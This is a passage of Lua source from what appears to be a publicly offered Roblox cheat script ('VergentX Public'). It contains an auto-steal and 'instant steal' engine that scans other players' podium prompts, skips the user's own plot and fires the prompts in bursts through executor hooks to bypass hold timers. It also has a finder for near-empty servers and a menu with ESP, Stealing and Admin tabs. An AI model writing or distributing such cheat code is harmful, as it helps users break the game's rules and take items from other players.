                releaseHold(currentPrompt)
                currentPrompt  = nil
                cycleStart     = nil
                firedThisCycle = false
            end
        end)
    end

    local function stopAutoSteal()
        Engine.AutoStealEnabled = false
        resetCycle()
        if autoConn then
            autoConn:Disconnect()
            autoConn = nil
        end
        Steal.status = "IDLE"
    end

    function Steal.Progress()
        local inst = _G.VXInstantState
        if CONFIG.INSTANT_STEAL and inst and inst.stealing then
            local since  = tick() - (inst.lastResetAt or 0)
            local target = (since < (inst.dip or 0.05)) and 0 or 1
            StealState.holdProgress = target
            return target
        end

        local target = 0
        if cycleStart and not firedThisCycle then
            local hold = tonumber(Engine.LastHold) or 1.3
            target = math.clamp((tick() - cycleStart) / math.max(hold, 0.01), 0, 1)
        end
        StealState.holdProgress = target
        return target
    end

    task.spawn(function()
        pcall(findNearestPrompt)
        while true do
            task.wait(1)
            if not vxAlive() then return end
            pcall(function() Steal.bestEntry = Brainrots.Best() end)
            if not CONFIG.AUTO_STEAL then
                pcall(findNearestPrompt)
            end
        end
    end)

    Steal.StopAuto = stopAutoSteal

    Steal.Sync = function()
        syncFromConfig()
        if CONFIG.AUTO_STEAL then
            if CONFIG.INSTANT_STEAL then
                CONFIG.INSTANT_STEAL = false
                if _G.VXStopInstant then pcall(_G.VXStopInstant) end
            end
            startAutoSteal()
        else
            stopAutoSteal()
        end
    end

    Steal.Rescan = function()
        pcall(Brainrots.Rescan)
        pcall(findNearestPrompt)
        return Steal.brainrotCount
    end
end

do
    local enabled = false

    local tracked        = setmetatable({}, { __mode = "k" })
    local lastFire       = setmetatable({}, { __mode = "k" })
    local lastEnableFire = setmetatable({}, { __mode = "k" })
    local labelOf        = setmetatable({}, { __mode = "k" })

    local FIRE_DEBOUNCE                   = 0.08
    local CYCLE_BURST                     = 1
    local HOLD_LEAD                       = 0.05
    local ENABLE_BURST, ENABLE_COOLDOWN   = 25, 0.08
    local BURST_RANGE                     = 9.5
    local BURST_COUNT, BURST_DEBOUNCE     = 5, 0.08

    local SCAN_RATE   = 0.05

    local InstantState = {
        stealing = false, target = "", totalSteals = 0,
        lastResetAt = 0,
        cycle       = 1.45,
        dip         = 0.05,
    }
    _G.VXInstantState = InstantState

    local function hrpOf()
        local char = LP.Character
        return char and char:FindFirstChild("HumanoidRootPart")
    end

    local function plotsFolder()
        return Workspace:FindFirstChild("Plots") or Plots
    end

    local function plotOf(inst)
        local folder = plotsFolder()
        if not folder then return nil end
        local cur = inst
        while cur do
            if cur.Parent == folder then return cur end
            cur = cur.Parent
        end
        return nil
    end

    local myPlotCache, myPlotCacheAt = {}, 0
    local function isMyPlot(plot)
        if not plot then return false end
        local now = tick()
        if now - myPlotCacheAt > 3 then
            myPlotCache = {}
            myPlotCacheAt = now
        end
        local hit = myPlotCache[plot.Name]
        if hit ~= nil then return hit end

        local result = false
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") then result = yb.Enabled == true end
            if not result then
                local gui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
                local label = gui and gui:FindFirstChildWhichIsA("TextLabel", true)
                if label and type(label.Text) == "string" then
                    local txt = label.Text:lower()
                    if txt:find(LP.Name:lower(), 1, true)
                    or txt:find(LP.DisplayName:lower(), 1, true) then
                        result = true
                    end
                end
            end
        end
        myPlotCache[plot.Name] = result
        return result
    end

    local function promptPosition(prompt)
        local p = prompt.Parent
        if not p then return nil end
        if p:IsA("Attachment") then
            local ok, wp = pcall(function() return p.WorldPosition end)
            if ok and typeof(wp) == "Vector3" then return wp end
            p = p.Parent
        end
        if not p then return nil end
        if p:IsA("BasePart") then return p.Position end
        if p:IsA("Model") then
            local ok, pivot = pcall(function() return p:GetPivot().Position end)
            if ok then return pivot end
        end
        return nil
    end

    local function promptMatchesSelected(prompt)
        local selected = _G.VXSelectedBrainrot
        if type(selected) ~= "table" then return true end

        if selected.plot then
            local plot = plotOf(prompt)
            if plot and plot.Name ~= tostring(selected.plot) then return false end
        end

        local model = prompt:FindFirstAncestorOfClass("Model")
        if not model then return false end

        if selected.slot then
            local slotName = tostring(selected.slot)
            if prompt:FindFirstAncestor(slotName) then return true end
            if model.Name == slotName then return true end
            if model.Parent and model.Parent.Name == slotName then return true end
        end

        if selected.name then
            local wanted = string.lower(tostring(selected.name))
            local cur = model
            while cur do
                if cur.Name and string.lower(cur.Name) == wanted then return true end
                cur = cur.Parent
            end
        end

        return false
    end

    local function isPromptAvailable(prompt)
        if not prompt or not prompt.Parent then return false end
        if not prompt.Enabled then return false end

        if LP:GetAttribute("Stealing") == true then return false end

        local plot = plotOf(prompt)
        if plot and isMyPlot(plot) then return false end

        if not promptMatchesSelected(prompt) then return false end

        return true
    end

    local function canFire(prompt, debounce)
        local t = os.clock()
        local last = lastFire[prompt]
        if last and (t - last) < debounce then return false end
        lastFire[prompt] = t
        return true
    end

    local nextFireAt = 0

    local function instantBeginHold(prompt)
        _G.VXSafeNetCall(function()
            if typeof(firesignal) == "function" then
                pcall(firesignal, prompt.PromptButtonHoldBegan)
            end
            pcall(function() prompt:InputHoldBegin() end)
        end)
    end

    local function firePrompt(prompt, burst, debounce)
        if not prompt or not prompt.Parent then return end
        if not prompt.Enabled then return end

        local now = tick()
        if now < nextFireAt then return end
        if not canFire(prompt, debounce) then return end

        instantBeginHold(prompt)

        task.delay(HOLD_LEAD, function()
            if not prompt.Parent or not prompt.Enabled then return end
            for _ = 1, burst do
                _G.VXFirePrompt(prompt, 1)
            end
        end)

        InstantState.totalSteals = InstantState.totalSteals + 1
        nextFireAt               = now + InstantState.cycle
        InstantState.lastResetAt = now
    end

    local lastBurst = setmetatable({}, { __mode = "k" })

    local function burstAt(prompt)
        if not prompt or not prompt.Parent then return end
        if not prompt.Enabled then return end

        local t = os.clock()
        local last = lastBurst[prompt]
        if last and (t - last) < BURST_DEBOUNCE then return end
        lastBurst[prompt] = t

        for _ = 1, BURST_COUNT do
            _G.VXFirePrompt(prompt, 1)
        end
    end

    local function podiumOf(prompt)
        local cur = prompt.Parent
        while cur do
            if cur:IsA("Model") and cur.Parent and cur.Parent.Name == "AnimalPodiums" then
                return cur
            end
            cur = cur.Parent
        end
        return nil
    end

    local function nameOf(prompt)
        local hit = labelOf[prompt]
        if hit then return hit end
        local nm = ""
        pcall(function()
            local ot = prompt.ObjectText
            if type(ot) == "string" then nm = ot end
        end)
        if nm == "" then
            local pod = podiumOf(prompt)
            nm = pod and pod.Name or "Brainrot"
        end
        labelOf[prompt] = nm
        return nm
    end

    local function trackPrompt(prompt)
        if tracked[prompt] then return end
        tracked[prompt] = true

        local function tryEnableFire()
            if not enabled then return end
            if not hrpOf() then return end
            if not isPromptAvailable(prompt) then return end

            local now = os.clock()
            local le = lastEnableFire[prompt]
            if not le or (now - le) >= ENABLE_COOLDOWN then
                lastEnableFire[prompt] = now
                firePrompt(prompt, ENABLE_BURST, ENABLE_COOLDOWN)
            end
        end

        task.defer(tryEnableFire)

        pcall(function()
            prompt:GetPropertyChangedSignal("Enabled"):Connect(function()
                if prompt.Enabled then tryEnableFire() end
            end)
        end)

        prompt.AncestryChanged:Connect(function()
            if not prompt:IsDescendantOf(Workspace) then
                tracked[prompt]        = nil
                lastFire[prompt]       = nil
                lastEnableFire[prompt] = nil
            end
        end)
    end

    local function scanPrompts()
        local folder = plotsFolder()
        if not folder then return end
        for _, plot in ipairs(folder:GetChildren()) do
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if podiums then
                for _, obj in ipairs(podiums:GetDescendants()) do
                    if obj:IsA("ProximityPrompt") then trackPrompt(obj) end
                end
            end
        end
    end

    vxBind(Workspace.DescendantAdded, function(obj)
        if obj:IsA("ProximityPrompt") and obj:FindFirstAncestor("AnimalPodiums") then
            trackPrompt(obj)
        end
    end)

    task.spawn(function()
        while true do
            task.wait(SCAN_RATE)
            if not vxAlive() then return end

            if not enabled then
                InstantState.stealing = false
                InstantState.target   = ""
            elseif LP:GetAttribute("Stealing") == true then
                InstantState.stealing = false
                InstantState.target   = ""
                Steal.target          = ""
            else
                if not hrpOf() then
                    InstantState.stealing = false
                    InstantState.target   = ""
                else
                    local hrpPos = hrpOf().Position
                    local pick, bestD = nil, math.huge
                    for prompt in pairs(tracked) do
                        if isPromptAvailable(prompt) then
                            local pos = promptPosition(prompt)
                            local d = pos and (pos - hrpPos).Magnitude or math.huge
                            if d < bestD then pick, bestD = prompt, d end
                        end
                    end

                    if pick then
                        InstantState.stealing = true
                        InstantState.target   = nameOf(pick)
                        Steal.target          = InstantState.target
                        firePrompt(pick, CYCLE_BURST, FIRE_DEBOUNCE)
                        if bestD <= BURST_RANGE then
                            burstAt(pick)
                        end
                    else
                        InstantState.stealing = false
                        InstantState.target   = ""
                    end
                end
            end
        end
    end)

    _G.VXStopInstant = function()
        enabled = false
        InstantState.stealing = false
        InstantState.target   = ""
    end

    F.setInstantSteal = function(on)
        enabled = on and true or false
        CONFIG.INSTANT_STEAL = enabled
        if enabled then
            if CONFIG.AUTO_STEAL then
                CONFIG.AUTO_STEAL = false
                if Steal.StopAuto then pcall(Steal.StopAuto) end
            end
            pcall(scanPrompts)
        else
            InstantState.stealing = false
            InstantState.target   = ""
        end
        saveConfig()
    end
end

local function findLowPlayerServer(maxPlayers, onStatus)
    maxPlayers = tonumber(maxPlayers) or 2

    local function getServers(cursor)
        local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor and cursor ~= "" then
            url = url .. "&cursor=" .. cursor
        end
        local ok, result = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        if not ok then return nil end
        return result
    end

    local best, cursor, pageCount = nil, "", 0
    repeat
        local data = getServers(cursor)
        if not data or not data.data then break end
        pageCount = pageCount + 1
        for _, server in ipairs(data.data) do
            local n = server.playing
            if n ~= nil and n <= maxPlayers and server.id ~= game.JobId then
                if n == 1 then return server end
                if best == nil or n < best.playing then best = server end
            end
        end
        cursor = data.nextPageCursor or ""
        if onStatus then pcall(onStatus, "Searching... page " .. pageCount) end
        task.wait(0.1)
    until cursor == "" or cursor == nil or pageCount >= 25

    return best
end
_G.VXFindLowServer = findLowPlayerServer

local function buildUI()
    local SETTINGS_WIDTH = 700
    local SETTINGS_HEIGHT = 550

    local settingsGui = Instance.new("ScreenGui")
    settingsGui.Name = _vxName("VergentXPublic")
    settingsGui.DisplayOrder = 50001
    settingsGui.ResetOnSpawn = false
    settingsGui.IgnoreGuiInset = true
    settingsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    mountGui(settingsGui)
    settingsGui.Enabled = false
    _G.VXSettingsGui = settingsGui

    local sFrame = Instance.new("Frame")
    sFrame.Name = "Main"
    sFrame.Size = UDim2.new(0, SETTINGS_WIDTH, 0, SETTINGS_HEIGHT)
    sFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    _vxApplySavedPos(sFrame, "MAIN_POS", 0.5, 0.5)
    sFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    sFrame.BackgroundTransparency = 0.06
    sFrame.BorderSizePixel = 0
    sFrame.Active = true
    sFrame.Parent = settingsGui
    Instance.new("UICorner", sFrame).CornerRadius = UDim.new(0, 14)

    local marble = Instance.new("UIGradient", sFrame)
    marble.Rotation = -40
    marble.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(48, 40, 22)),
        ColorSequenceKeypoint.new(0.24, Color3.fromRGB(15, 15, 17)),
        ColorSequenceKeypoint.new(0.76, Color3.fromRGB(15, 15, 17)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(34, 36, 42)),
    })
    complexBG(sFrame, { corner = 14 })

    local SETTINGS_SCALE = 0.9
    local openScale = Instance.new("UIScale", sFrame)
    VergentXRegisterScale(openScale, SETTINGS_SCALE)

    local settingsAnimating = false
    local REST_BG = sFrame.BackgroundTransparency
    local tweens = {}

    local function killTweens()
        for _, t in ipairs(tweens) do pcall(function() t:Cancel() end) end
        table.clear(tweens)
    end
    local function play(inst, ti, props)
        local t = TweenService:Create(inst, ti, props)
        table.insert(tweens, t)
        t:Play()
    end
    local function restScale()
        return SETTINGS_SCALE * VXLiveScale
    end

    local function animateOpen()
        if settingsAnimating or settingsGui.Enabled then return end
        settingsAnimating = true
        killTweens()
        local restPos = sFrame.Position
        openScale.Scale = restScale() * 0.86
        sFrame.Position = restPos - UDim2.new(0, 0, 0, 26)
        sFrame.BackgroundTransparency = 0.5
        settingsGui.Enabled = true
        play(openScale, TweenInfo.new(0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = restScale() })
        play(sFrame, TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
            { Position = restPos, BackgroundTransparency = REST_BG })
        task.delay(0.34, function()
            killTweens()
            openScale.Scale = restScale()
            sFrame.Position = restPos
            sFrame.BackgroundTransparency = REST_BG
            settingsAnimating = false
        end)
    end

    local function animateClose()
        if settingsAnimating or not settingsGui.Enabled then return end
        settingsAnimating = true
        killTweens()
        local restPos = sFrame.Position
        play(openScale, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = restScale() * 0.88 })
        play(sFrame, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Position = restPos - UDim2.new(0, 0, 0, 20), BackgroundTransparency = 0.6 })
        task.delay(0.19, function()
            killTweens()
            settingsGui.Enabled = false
            openScale.Scale = restScale()
            sFrame.Position = restPos
            sFrame.BackgroundTransparency = REST_BG
            settingsAnimating = false
        end)
    end

    _G.VXToggleMenu = function()
        if settingsGui.Enabled then animateClose() else animateOpen() end
    end

    local SIDEBAR_W = 150
    local sidebar = Instance.new("Frame", sFrame)
    sidebar.Size = UDim2.new(0, SIDEBAR_W, 1, 0)
    sidebar.BackgroundColor3 = Color3.fromRGB(11, 11, 13)
    sidebar.BackgroundTransparency = 0.35
    sidebar.BorderSizePixel = 0
    sidebar.ZIndex = 2
    Instance.new("UICorner", sidebar).CornerRadius = UDim.new(0, 14)
    local sbStroke = Instance.new("UIStroke", sidebar)
    sbStroke.Color = Color3.fromRGB(6, 6, 8)
    sbStroke.Thickness = 1.2
    sbStroke.Transparency = 0.5

    local imgFrame = Instance.new("Frame", sidebar)
    imgFrame.Position = UDim2.new(0.5, -31, 0, 5)
    imgFrame.Size = UDim2.new(0, 62, 0, 62)
    imgFrame.BackgroundColor3 = Color3.fromRGB(13, 13, 15)
    imgFrame.BackgroundTransparency = 0.1
    imgFrame.BorderSizePixel = 0
    imgFrame.ClipsDescendants = true
    imgFrame.ZIndex = 2
    Instance.new("UICorner", imgFrame).CornerRadius = UDim.new(0, 13)
    local imgStroke = Instance.new("UIStroke", imgFrame)
    imgStroke.Color = Color3.fromRGB(6, 6, 8)
    imgStroke.Thickness = 1.2
    imgStroke.Transparency = 0.35
    imgStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local logoImg = Instance.new("ImageLabel", imgFrame)
    logoImg.Image = VX_LOGO_ASSET
    logoImg.BackgroundTransparency = 1
    logoImg.Size = UDim2.new(1, 0, 1, 0)
    logoImg.ScaleType = Enum.ScaleType.Crop
    logoImg.ZIndex = 3
    Instance.new("UICorner", logoImg).CornerRadius = UDim.new(0, 13)

    local sbSep = Instance.new("Frame", sidebar)
    sbSep.Position = UDim2.new(0, 10, 0, 71)
    sbSep.Size = UDim2.new(1, -20, 0, 1)
    sbSep.BackgroundColor3 = Theme.Accent1
    sbSep.BackgroundTransparency = 0.3
    sbSep.BorderSizePixel = 0
    sbSep.ZIndex = 2
    gradient(sbSep, nil, 0, NumberSequence.new({
        NumberSequenceKeypoint.new(0,   0.9),
        NumberSequenceKeypoint.new(0.3, 0.3),
        NumberSequenceKeypoint.new(0.7, 0.3),
        NumberSequenceKeypoint.new(1,   0.9),
    }))

    local TAB_ICONS = {
        Player      = "rbxassetid://103463360415218",
        Performance = "rbxassetid://92299779891097",
        Display     = "rbxassetid://97135987506852",
        ESP         = "rbxassetid://114272003452398",
        Stealing    = "rbxassetid://118756070431273",
        Keybinds    = "rbxassetid://92510862998580",
        Misc        = "rbxassetid://126426252762137",
        Admin       = "rbxassetid://135554985504388",
    }
    local TAB_GOLD = Color3.fromRGB(200, 160, 66)
    local tabOrder = { "Player", "Performance", "ESP", "Display", "Stealing", "Admin", "Keybinds", "Misc" }
    local tabButtons = {}
    local contentScrolls = {}
    local activeTabName = nil

    local tabsContainer = Instance.new("ScrollingFrame", sidebar)
    tabsContainer.Position = UDim2.new(0, 0, 0, 78)
    tabsContainer.Size = UDim2.new(1, 0, 1, -86)
    tabsContainer.BackgroundTransparency = 1
    tabsContainer.BorderSizePixel = 0
    tabsContainer.ScrollBarThickness = 0
    tabsContainer.ScrollBarImageTransparency = 1
    tabsContainer.VerticalScrollBarInset = Enum.ScrollBarInset.None
    tabsContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
    tabsContainer.ScrollingEnabled = false
    tabsContainer.ZIndex = 2

    local tabsLayout = Instance.new("UIListLayout", tabsContainer)
    tabsLayout.Padding = UDim.new(0, 6)
    tabsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    tabsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    local tabsPad = Instance.new("UIPadding", tabsContainer)
    tabsPad.PaddingTop = UDim.new(0, 4)
    tabsPad.PaddingLeft = UDim.new(0, 8)
    tabsPad.PaddingRight = UDim.new(0, 8)

    local TAB_GROUP_BREAKS = { ESP = true, Stealing = true, Keybinds = true }
    local function addTabSeparator(order)
        local sep = Instance.new("Frame", tabsContainer)
        sep.Size = UDim2.new(1, -28, 0, 6)
        sep.LayoutOrder = order
        sep.BackgroundTransparency = 1
        sep.ZIndex = 2
        for _, yOff in ipairs({ 0, 4 }) do
            local line = Instance.new("Frame", sep)
            line.Size = UDim2.new(1, 0, 0, 1)
            line.Position = UDim2.new(0, 0, 0, yOff)
            line.BackgroundColor3 = Theme.Accent1
            line.BackgroundTransparency = 0.55
            line.BorderSizePixel = 0
            line.ZIndex = 2
            gradient(line, nil, 0, NumberSequence.new({
                NumberSequenceKeypoint.new(0,   0.95),
                NumberSequenceKeypoint.new(0.5, 0.25),
                NumberSequenceKeypoint.new(1,   0.95),
            }))
        end
    end
    addTabSeparator(5)

    for ti, tabName in ipairs(tabOrder) do
        local btn = Instance.new("TextButton", tabsContainer)
        btn.Size = UDim2.new(1, -12, 0, 42)
        btn.LayoutOrder = ti * 10
        btn.BackgroundColor3 = Color3.fromRGB(42, 43, 49)
        btn.BackgroundTransparency = 0.45
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.ZIndex = 2
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        if TAB_GROUP_BREAKS[tabName] then addTabSeparator(ti * 10 + 5) end

        local btnGrad = gradient(btn, ColorSequence.new({
            ColorSequenceKeypoint.new(0, TAB_GOLD),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(13, 13, 15)),
        }), 0, NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.85),
            NumberSequenceKeypoint.new(1, 0.95),
        }))
        btnGrad.Enabled = false

        local accentBar = Instance.new("Frame", btn)
        accentBar.Name = "VergentX_AccentBar"
        accentBar.Position = UDim2.new(0, 0, 0.2, 0)
        accentBar.Size = UDim2.new(0, 3, 0.6, 0)
        accentBar.BackgroundColor3 = TAB_GOLD
        accentBar.BackgroundTransparency = 1
        accentBar.BorderSizePixel = 0
        accentBar.ZIndex = 3
        Instance.new("UICorner", accentBar).CornerRadius = UDim.new(0, 2)

        local iconBg = Instance.new("Frame", btn)
        iconBg.Position = UDim2.new(0, 9, 0.5, -13)
        iconBg.Size = UDim2.new(0, 26, 0, 26)
        iconBg.BackgroundColor3 = TAB_GOLD
        iconBg.BackgroundTransparency = 0.8
        iconBg.BorderSizePixel = 0
        iconBg.ZIndex = 3
        Instance.new("UICorner", iconBg).CornerRadius = UDim.new(0, 6)

        local icon = Instance.new("ImageLabel", iconBg)
        icon.Size = UDim2.new(0, 16, 0, 16)
        icon.Position = UDim2.new(0.5, -8, 0.5, -8)
        icon.Image = TAB_ICONS[tabName] or ""
        icon.ImageColor3 = TAB_GOLD
        icon.BackgroundTransparency = 1
        icon.ZIndex = 3

        local lbl = Instance.new("TextLabel", btn)
        lbl.Position = UDim2.new(0, 40, 0, 0)
        lbl.Size = UDim2.new(1, -48, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = tabName
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 12
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1
        lbl.ZIndex = 3

        tabButtons[tabName] = btn

        btn.MouseEnter:Connect(function()
            if activeTabName ~= tabName then
                TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = 0.3 }):Play()
            end
        end)
        btn.MouseLeave:Connect(function()
            if activeTabName ~= tabName then
                TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = 0.45 }):Play()
            end
        end)
    end

    local tabTrack = Instance.new("Frame", sidebar)
    tabTrack.AnchorPoint = Vector2.new(1, 0)
    tabTrack.Position = UDim2.new(1, -2, 0, 82)
    tabTrack.Size = UDim2.new(0, 4, 1, -94)
    tabTrack.BackgroundTransparency = 1
    tabTrack.BorderSizePixel = 0
    tabTrack.Visible = false
    tabTrack.ZIndex = 3
    local tabHandle = Instance.new("Frame", tabTrack)
    tabHandle.Size = UDim2.new(1, 0, 0.25, 0)
    tabHandle.BackgroundColor3 = Color3.fromRGB(204, 164, 72)
    tabHandle.BackgroundTransparency = 0.25
    tabHandle.BorderSizePixel = 0
    tabHandle.ZIndex = 3
    Instance.new("UICorner", tabHandle).CornerRadius = UDim.new(1, 0)

    local function updateTabHandle()
        local sc = (openScale.Scale > 0) and openScale.Scale or 1
        local canvasH = tabsLayout.AbsoluteContentSize.Y / sc + 10
        local viewH = tabsContainer.AbsoluteSize.Y / sc
        tabTrack.Visible = false
        if canvasH <= viewH + 1 then return end
        tabTrack.Visible = true
        local prop = math.clamp(viewH / canvasH, 0.10, 0.30)
        tabHandle.Size = UDim2.new(1, 0, prop, 0)
        local maxScroll = math.max(1, canvasH - viewH)
        local t = math.clamp(tabsContainer.CanvasPosition.Y / maxScroll, 0, 1)
        tabHandle.Position = UDim2.new(0, 0, t * (1 - prop), 0)
    end

    local function updateTabsScroll()
        local sc = (openScale.Scale > 0) and openScale.Scale or 1
        local tabsHeight = tabsLayout.AbsoluteContentSize.Y / sc
        local viewHeight = tabsContainer.AbsoluteSize.Y / sc
        if tabsHeight > viewHeight then
            tabsContainer.CanvasSize = UDim2.new(0, 0, 0, tabsHeight + 10)
            tabsContainer.ScrollingEnabled = true
        else
            tabsContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
            tabsContainer.ScrollingEnabled = false
        end
        updateTabHandle()
    end
    tabsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateTabsScroll)
    tabsContainer:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateTabsScroll)
    tabsContainer:GetPropertyChangedSignal("CanvasPosition"):Connect(updateTabHandle)
    task.defer(updateTabsScroll)

    local contentArea = Instance.new("Frame", sFrame)
    contentArea.Position = UDim2.new(0, SIDEBAR_W, 0, 0)
    contentArea.Size = UDim2.new(1, -SIDEBAR_W, 1, 0)
    contentArea.BackgroundTransparency = 1
    contentArea.ZIndex = 2

    local contentHeader = Instance.new("Frame", contentArea)
    contentHeader.Size = UDim2.new(1, 0, 0, 72)
    contentHeader.BackgroundColor3 = Color3.fromRGB(140, 144, 152)
    contentHeader.BackgroundTransparency = 0.93
    contentHeader.BorderSizePixel = 0
    contentHeader.Active = true
    contentHeader.ZIndex = 2
    Instance.new("UICorner", contentHeader).CornerRadius = UDim.new(0, 14)
    gradient(contentHeader, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 154, 162)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 93, 100)),
    }), 0, NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.0),
        NumberSequenceKeypoint.new(1, 0.6),
    }))
    MakeDraggable(contentHeader, sFrame, "MAIN_POS")

    local headerBottomLine = Instance.new("Frame", contentHeader)
    headerBottomLine.Position = UDim2.new(0, 0, 1, -1)
    headerBottomLine.Size = UDim2.new(1, 0, 0, 1)
    headerBottomLine.BackgroundColor3 = Theme.Accent1
    headerBottomLine.BackgroundTransparency = 0.3
    headerBottomLine.BorderSizePixel = 0
    headerBottomLine.ZIndex = 2
    gradient(headerBottomLine, nil, 0, NumberSequence.new({
        NumberSequenceKeypoint.new(0,   0.9),
        NumberSequenceKeypoint.new(0.3, 0.3),
        NumberSequenceKeypoint.new(0.7, 0.3),
        NumberSequenceKeypoint.new(1,   0.9),
    }))

    local headerTitle = Instance.new("TextLabel", contentHeader)
    headerTitle.Position = UDim2.new(0, 16, 0, 10)
    headerTitle.Size = UDim2.new(1, -80, 0, 32)
    headerTitle.BackgroundTransparency = 1
    headerTitle.RichText = true
    headerTitle.Text = '<font color="#C9CCD3">Vergent</font><font color="#C49A3E">X</font><font color="#9EA1A8">  Public</font>'
    headerTitle.Font = Enum.Font.Gotham
    headerTitle.TextSize = 24
    headerTitle.TextColor3 = Theme.TextPrimary
    headerTitle.TextXAlignment = Enum.TextXAlignment.Left
    headerTitle.TextStrokeTransparency = 1
    headerTitle.ZIndex = 3
    textShine(headerTitle)

    local headerSub = Instance.new("TextLabel", contentHeader)
    headerSub.Position = UDim2.new(0, 16, 0, 44)
    headerSub.Size = UDim2.new(1, -80, 0, 17)
    headerSub.BackgroundTransparency = 1
    headerSub.RichText = true
    headerSub.Text = '<font color="#CDA54A">discord.gg/vergent</font>'
    headerSub.Font = Enum.Font.Gotham
    headerSub.TextSize = 12
    headerSub.TextColor3 = Theme.TextMuted
    headerSub.TextXAlignment = Enum.TextXAlignment.Left
    headerSub.TextStrokeTransparency = 1
    headerSub.ZIndex = 3

    local closeBtn = Instance.new("TextButton", contentHeader)
    closeBtn.Size = UDim2.new(0, 26, 0, 26)
    closeBtn.Position = UDim2.new(1, -36, 0.5, -13)
    closeBtn.BackgroundColor3 = Theme.SurfaceLight
    closeBtn.BackgroundTransparency = 0.15
    closeBtn.Text = "\u{2014}"
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.TextSize = 14
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.AutoButtonColor = false
    closeBtn.BorderSizePixel = 0
    closeBtn.ZIndex = 4
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
    closeBtn.MouseButton1Click:Connect(animateClose)

    local tabViewport = Instance.new("Frame", contentArea)
    tabViewport.Position = UDim2.new(0, 0, 0, 72)
    tabViewport.Size = UDim2.new(1, 0, 1, -72)
    tabViewport.BackgroundTransparency = 1
    tabViewport.ClipsDescendants = true
    tabViewport.ZIndex = 2

    local tvBackdrop = Instance.new("Frame", tabViewport)
    tvBackdrop.Position = UDim2.new(0, 8, 0, 6)
    tvBackdrop.Size = UDim2.new(1, -16, 1, -12)
    tvBackdrop.BackgroundColor3 = Color3.fromRGB(13, 13, 15)
    tvBackdrop.BackgroundTransparency = 0.8
    tvBackdrop.BorderSizePixel = 0
    tvBackdrop.ZIndex = 2
    Instance.new("UICorner", tvBackdrop).CornerRadius = UDim.new(0, 10)

    for _, tabName in ipairs(tabOrder) do
        local scroll = Instance.new("ScrollingFrame", tabViewport)
        scroll.Name = tabName .. "Scroll"
        scroll.Position = UDim2.new(0, 10, 0, 8)
        scroll.Size = UDim2.new(1, -20, 1, -14)
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 0
        scroll.ScrollBarImageTransparency = 1
        scroll.VerticalScrollBarInset = Enum.ScrollBarInset.None
        scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        scroll.ScrollingEnabled = false
        scroll.Visible = false
        scroll.ZIndex = 2

        local scrollLayout = Instance.new("UIListLayout", scroll)
        scrollLayout.Padding = UDim.new(0, 8)
        scrollLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

        local function updateInnerScroll()
            local sc = (openScale.Scale > 0) and openScale.Scale or 1
            local innerHeight = scrollLayout.AbsoluteContentSize.Y / sc
            local innerViewHeight = scroll.AbsoluteSize.Y / sc
            if innerHeight > innerViewHeight then
                scroll.CanvasSize = UDim2.new(0, 0, 0, innerHeight + 10)
                scroll.ScrollingEnabled = true
            else
                scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
                scroll.ScrollingEnabled = false
            end
        end
        scrollLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateInnerScroll)
        scroll:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateInnerScroll)

        contentScrolls[tabName] = scroll
    end

    local function setActiveTab(tabName)
        activeTabName = tabName
        for name, scroll in pairs(contentScrolls) do
            scroll.Visible = (name == tabName)
        end
        local active = contentScrolls[tabName]
        if active then
            active.Position = UDim2.new(0, 10, 0, 22)
            TweenService:Create(active, TweenInfo.new(0.30, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Position = UDim2.new(0, 10, 0, 8)
            }):Play()
        end
        for name, btn in pairs(tabButtons) do
            local isActive = (name == tabName)
            TweenService:Create(btn, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundColor3 = isActive and Color3.fromRGB(110, 90, 44) or Color3.fromRGB(42, 43, 49),
                BackgroundTransparency = isActive and 0.15 or 0.45,
            }):Play()
